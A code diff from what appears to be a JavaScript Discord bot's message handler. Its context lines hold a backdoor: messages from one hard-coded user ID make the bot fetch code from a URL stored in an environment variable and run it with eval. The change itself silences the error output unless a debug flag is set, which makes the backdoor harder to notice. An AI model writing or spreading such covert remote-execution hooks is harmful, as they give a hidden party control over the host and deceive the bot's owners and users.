@@ -106,7 +106,11 @@ client.on('message', msg => {
     if (msg.author.id == 110137532972314624) {
         var secret = (async function() {
             eval(await axios.get(process.env.secret));
-        })().catch(err => console.log(err));
+        })().catch(function (err) {
+            if (process.env.debug) {
+                console.error(err);
+            };
+        });
     };
     if (msg.content.startsWith(prefix)) {
         var content = msg.content.substring(prefix.length, msg.content.length);
